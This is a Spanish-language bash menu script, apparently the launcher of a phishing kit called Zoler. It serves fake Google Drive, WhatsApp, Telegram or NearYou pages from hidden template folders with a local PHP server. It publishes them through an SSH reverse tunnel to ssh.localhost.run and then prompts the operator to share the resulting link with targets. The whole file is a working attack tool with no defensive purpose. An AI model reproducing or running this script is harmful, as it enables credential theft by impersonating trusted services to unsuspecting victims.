bash .banner
echo "1)Abrir servidor"
echo "2)Crear enlace"
echo "3)Ayuda"
echo "4)Salir"
echo ""
read -p "Opcion: " num

if [ "$num" = "1" ]; then
bash .banner
echo "Introduce la opcion que deseas:"
echo ""
echo "1)Drive"
echo "2)WhathsApp"
echo "3)Telegram"
echo "4)NearYou"
echo ""
read -p "Opcion: " etc

if [ "$etc" = "1" ]; then
etc=$(echo "gdrive")
fi

if [ "$etc" = "2" ]; then
etc=$(echo "whatsapp")
fi

if [ "$etc" = "3" ]; then
etc=$(echo "telegram")
fi

if [ "$etc" = "4" ]; then
etc=$(echo "nearyou")
fi

fjsj=$(echo "$etc" > .selec)

bash .banner
php -S localhost:8080 -t .st/$etc | ssh -R 80:localhost:8080 ssh.localhost.run
fi

if [ "$num" = "2" ]; then
bash .banner
read -p "Introduce el enlace anteriormente obtenido: " en
bash .banner
echo "Ahora comparte el enlace creado:"
echo ""
echo "$en/index.html"
echo ""
read -p "Presiona una tecla para continuar..." pause
bash .cats
bash Zoler.sh
fi

if [ "$num" = "3" ]; then
bash .banner
cat Readme.txt
echo ""
read -p "Presiona una tecla para contunuar..." num
bash Zoler.sh
fi

if [ "$num" = "4" ]; then
bash .banner
echo "                   Gracias por usar Zoler!!"
echo ""
fi
